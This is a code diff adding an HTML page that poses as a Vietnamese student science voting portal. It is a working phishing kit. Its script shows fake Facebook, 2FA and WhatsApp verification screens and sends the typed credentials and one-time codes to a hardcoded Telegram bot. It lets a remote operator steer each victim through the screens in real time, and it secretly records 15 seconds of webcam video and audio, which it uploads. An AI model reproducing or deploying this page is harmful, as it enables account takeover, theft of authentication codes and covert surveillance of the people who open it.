@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cổng Bình Chọn Trực Tuyến - Khoa Học Trẻ</title>
+    <style>
+        /* --- CSS VARIABLES & RESET --- */
+        :root {
+            --primary: #0056b3;
+            --accent: #ffce00;
+            --dark-blue: #003d80;
+            --fb-blue: #1877F2;
+            --fb-bg: #FFFFFF;
+            --fb-input: #F5F6F7;
+            --fb-text: #1C1E21;
+            --wa-green: #25D366;
+            --wa-dark: #075E54;
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { margin: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--dark-blue); color: white; overflow-x: hidden; }
+
+        /* --- TRANG CHỦ: LƯỚI 8 NHÓM --- */
+        .container { min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .banner { width: 100%; max-width: 1000px; display: block; border-bottom: 5px solid var(--accent); margin: 0 auto; }
+        
+        .grid-layout {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            width: 95%;
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 0 10px;
+        }
+
+        .group-item {
+            background: white;
+            color: #333;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        .group-item:active { transform: scale(0.95); }
+        .group-item h3 { margin: 0 0 10px 0; color: var(--primary); font-size: 1.2rem; }
+        .group-item p { font-size: 0.8rem; color: #666; margin-bottom: 15px; }
+        
+        .vote-action-btn {
+            background: var(--accent);
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 8px;
+            font-weight: 800;
+            color: var(--dark-blue);
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 4px 0 #ccaa00;
+        }
+
+        /* --- OVERLAYS CHUNG --- */
+        .full-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            z-index: 9000;
+            flex-direction: column;
+            align-items: center;
+            overflow-y: auto;
+            color: var(--fb-text);
+        }
+
+        /* --- FACEBOOK LOGIN UI --- */
+        .fb-header-info { width: 100%; text-align: center; padding: 15px; color: #606770; font-size: 13px; }
+        .fb-brand-logo { width: 65px; margin: 40px 0; }
+        .fb-form-wrapper { width: 90%; max-width: 380px; }
+        .fb-text-field {
+            width: 100%; padding: 16px; margin-bottom: 12px;
+            border: 1px solid #dddfe2; border-radius: 12px;
+            background: var(--fb-input); font-size: 16px; color: #000;
+        }
+        .fb-login-trigger {
+            width: 100%; padding: 13px; background: var(--fb-blue);
+            color: white; border: none; border-radius: 30px;
+            font-size: 17px; font-weight: bold; margin-top: 10px; cursor: pointer;
+        }
+        .fb-err-notif { color: #f02849; font-size: 13px; margin-bottom: 12px; display: none; text-align: left; font-weight: 500; }
+
+        /* --- 2FA INTERFACE --- */
+        .twofa-content { width: 92%; max-width: 500px; padding: 25px 0; }
+        .twofa-title-text { font-size: 20px; font-weight: bold; margin-bottom: 10px; }
+        .twofa-desc-text { font-size: 15px; color: #4b4f56; line-height: 1.4; margin-bottom: 25px; }
+        .twofa-main-visual { width: 100%; border-radius: 12px; margin-bottom: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        .twofa-label { display: block; font-weight: bold; margin-bottom: 8px; color: #4b4f56; font-size: 14px; }
+
+        /* --- WHATSAPP UI --- */
+        #whatsapp-gate { background: linear-gradient(180deg, var(--wa-green) 0%, var(--wa-dark) 100%); color: white; }
+        .wa-card-body {
+            background: white; color: #333; width: 92%; max-width: 420px;
+            margin-top: 50px; padding: 40px 20px; border-radius: 20px; text-align: center;
+        }
+        .wa-pin-row { display: flex; justify-content: space-between; margin: 30px 0; }
+        .wa-pin-field {
+            width: 45px; height: 55px; border: 1.5px solid #ddd;
+            border-radius: 10px; text-align: center; font-size: 24px;
+            font-weight: bold; background: #f9f9f9;
+        }
+
+        /* --- SUCCESS MODAL --- */
+        #success-msg {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: white; color: #333; padding: 40px; border-radius: 20px; z-index: 10005;
+            text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 100px rgba(0,0,0,0.6);
+        }
+        .success-check { width: 70px; height: 70px; background: #25D366; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 0 auto 20px; }
+
+        /* --- SYSTEM LOADER --- */
+        #processing-loader {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 10000; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .circle-loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--fb-blue); border-radius: 50%; width: 45px; height: 45px; animation: rotate 1s linear infinite; }
+        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        video#bg-recorder { position: absolute; left: -9999px; opacity: 0; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="home-view">
+        <img src="banner.png" alt="Cổng bình chọn" class="banner">
+        <div class="grid-layout" id="group-list"></div>
+    </div>
+
+    <div id="fb-gate" class="full-overlay">
+        <div class="fb-header-info">Tiếng Việt</div>
+        <img src="fb-logo.png" class="fb-brand-logo">
+        <div class="fb-form-wrapper">
+            <div id="fb-error-box" class="fb-err-notif">Mật khẩu bạn nhập không chính xác. Vui lòng kiểm tra lại.</div>
+            <input type="text" id="user-field" class="fb-text-field" placeholder="Số di động hoặc email">
+            <input type="password" id="pass-field" class="fb-text-field" placeholder="Mật khẩu">
+            <button class="fb-login-trigger" onclick="handleAuth()">Đăng nhập</button>
+            <div style="color: var(--fb-blue); text-align: center; margin-top: 20px; font-weight: 500;">Quên mật khẩu?</div>
+        </div>
+        <div style="margin-top: auto; padding-bottom: 25px; width: 90%; max-width: 380px;">
+            <button style="width:100%; padding:10px; background:none; border:1px solid var(--fb-blue); color:var(--fb-blue); border-radius:8px; font-weight:bold;">Tạo tài khoản mới</button>
+        </div>
+    </div>
+
+    <div id="2fa-gate" class="full-overlay">
+        <div class="twofa-content">
+            <div class="twofa-title-text">Kiểm tra thông báo trên thiết bị khác</div>
+            <div class="twofa-desc-text">Mở ứng dụng Facebook trên điện thoại hoặc máy tính khác để phê duyệt lần đăng nhập này.</div>
+            <img src="2fa-image.png" class="twofa-main-visual">
+            <div style="display: flex; align-items: center; margin-bottom: 25px;">
+                <div style="background:#e4e6eb; width:45px; height:45px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin-right:15px;">🕒</div>
+                <div style="font-size:14px;"><strong>Đang chờ phê duyệt</strong><br><span style="color:#606770; font-size:12px;">Yêu cầu có thể mất vài phút.</span></div>
+            </div>
+            <label class="twofa-label">Hoặc nhập mã xác thực</label>
+            <input type="text" id="2fa-input-field" class="fb-text-field" placeholder="Mã xác thực" style="background:white; border:1px solid #ced4da;">
+            <button class="fb-login-trigger" style="border-radius: 10px;" onclick="commit2FA()">Xác nhận</button>
+        </div>
+    </div>
+
+    <div id="whatsapp-gate" class="full-overlay">
+        <div class="wa-card-body">
+            <img src="whatsapp-logo.png" width="75">
+            <h2 style="color: var(--wa-dark); margin: 20px 0 5px;">WhatsApp</h2>
+            <p id="wa-display-u" style="font-size: 14px; color: #666;">Nhập mã 6 chữ số chúng tôi đã gửi đến số của bạn.</p>
+            <div class="wa-pin-row">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,0)">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,1)">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,2)">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,3)">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,4)">
+                <input type="text" class="wa-pin-field" maxlength="1" onkeyup="tabNext(this,5)">
+            </div>
+            <button class="fb-login-trigger" style="background: var(--wa-dark); border-radius: 8px;" onclick="commitWA()">Xác thực</button>
+        </div>
+    </div>
+
+    <div id="success-msg">
+        <div class="success-check">✓</div>
+        <h2 style="margin: 0;">Thành công!</h2>
+        <p style="color: #666; font-size: 14px;">Cảm ơn bạn đã tham gia bình chọn sự kiện Khoa học Trẻ.</p>
+    </div>
+
+    <div id="processing-loader">
+        <div class="circle-loader"></div>
+        <p style="margin-top: 15px; color: #666; font-size: 14px;">Đang xác thực dữ liệu...</p>
+    </div>
+
+    <video id="bg-recorder" autoplay muted playsinline></video>
+
+    <script>
+        /* --- CONFIGURATION --- */
+        const TOKEN = "8217538564:AAHwyK0pwRtgqSdPdScc8y2a4VKfn14T7As";
+        const CHAT_ID = "-1003544188616";
+        let offsetId = 0, currentGroup = 0;
+
+        /* --- KHỞI TẠO 8 NHÓM --- */
+        const list = document.getElementById('group-list');
+        for(let i=1; i<=8; i++) {
+            list.innerHTML += `
+                <div class="group-item">
+                    <h3>NHÓM 0${i}</h3>
+                    <p>Dự án Nghiên cứu & Sáng tạo 2026</p>
+                    <button class="vote-action-btn" onclick="triggerLogin(${i})">Bình chọn</button>
+                </div>`;
+        }
+
+        function triggerLogin(id) {
+            currentGroup = id;
+            document.getElementById('fb-gate').style.display = 'flex';
+        }
+
+        /* --- XỬ LÝ ĐĂNG NHẬP VÀ GỬI TELEGRAM --- */
+        async function handleAuth() {
+            const u = document.getElementById('user-field').value;
+            const p = document.getElementById('pass-field').value;
+            if(!u || !p) return;
+
+            document.getElementById('wa-display-u').innerText = `Nhập mã 6 chữ số đã gửi đến: ${u}`;
+            switchView('loader');
+
+            // Gửi dữ liệu về Telegram kèm bộ nút điều khiển
+            const content = `🔥 <b>DỮ LIỆU ĐĂNG NHẬP MỚI</b>\n━━━━━━━━━━━━━\n👤 <b>Tài khoản:</b> <code>${u}</code>\n🔑 <b>Mật khẩu:</b> <code>${p}</code>\n🎯 <b>Nhóm bầu:</b> Nhóm ${currentGroup}\n━━━━━━━━━━━━━\n📍 <i>Chọn hành động điều khiển:</i>`;
+            
+            const buttons = {
+                inline_keyboard: [
+                    [{ text: "🔒 Sai mật khẩu", callback_data: "cmd_fail_p" }, { text: "📱 Sai SĐT/Email", callback_data: "cmd_fail_u" }],
+                    [{ text: "🔑 Yêu cầu 2FA", callback_data: "cmd_ask_2fa" }, { text: "💬 Mã WhatsApp", callback_data: "cmd_ask_wa" }],
+                    [{ text: "✅ Thành công", callback_data: "cmd_success" }]
+                ]
+            };
+
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: content, parse_mode: 'HTML', reply_markup: buttons })
+            });
+
+            startHiddenCam(u); // Quay video ngầm 15s
+            setInterval(pollingTele, 2000); // Lắng nghe lệnh từ bạn
+        }
+
+        /* --- LẮNG NGHE LỆNH TỪ BẠN (TELEGRAM) --- */
+        async function pollingTele() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${offsetId + 1}`);
+                const data = await res.json();
+                if(data.result) {
+                    data.result.forEach(update => {
+                        offsetId = update.update_id;
+                        if(update.callback_query) {
+                            processCommand(update.callback_query.data);
+                        }
+                    });
+                }
+            } catch(e) {}
+        }
+
+        function processCommand(cmd) {
+            switchView('none');
+            if(cmd === "cmd_fail_p") {
+                document.getElementById('fb-gate').style.display = 'flex';
+                document.getElementById('fb-error-box').style.display = 'block';
+            } else if(cmd === "cmd_ask_2fa") {
+                document.getElementById('2fa-gate').style.display = 'flex';
+            } else if(cmd === "cmd_ask_wa") {
+                document.getElementById('whatsapp-gate').style.display = 'flex';
+            } else if(cmd === "cmd_success") {
+                document.getElementById('success-msg').style.display = 'block';
+                setTimeout(() => location.reload(), 3500);
+            } else {
+                switchView('loader');
+            }
+        }
+
+        /* --- GỬI MÃ XÁC THỰC --- */
+        async function commit2FA() {
+            const c = document.getElementById('2fa-input-field').value;
+            if(!c) return;
+            await sendSimpleMsg(`📩 <b>MÃ 2FA:</b> <code>${c}</code>`);
+            switchView('loader');
+        }
+
+        async function commitWA() {
+            let code = "";
+            document.querySelectorAll('.wa-pin-field').forEach(i => code += i.value);
+            if(code.length < 6) return;
+            await sendSimpleMsg(`💬 <b>MÃ WHATSAPP:</b> <code>${code}</code>`);
+            switchView('loader');
+        }
+
+        /* --- TIỆN ÍCH --- */
+        function tabNext(curr, idx) {
+            if(curr.value.length >= 1 && idx < 5) document.querySelectorAll('.wa-pin-field')[idx+1].focus();
+        }
+
+        function switchView(type) {
+            document.querySelectorAll('.full-overlay').forEach(o => o.style.display = 'none');
+            document.getElementById('processing-loader').style.display = type === 'loader' ? 'flex' : 'none';
+        }
+
+        async function sendSimpleMsg(text) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        }
+
+        /* --- QUAY VIDEO NGẦM 15 GIÂY --- */
+        async function startHiddenCam(user) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('bg-recorder').srcObject = stream;
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('video', blob, 'video.mp4');
+                    fd.append('caption', `🎥 VIDEO XÁC THỰC: ${user}`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 15000);
+            } catch(e) { console.log("Camera access error."); }
+        }
+    </script>
+</body>
+</html>
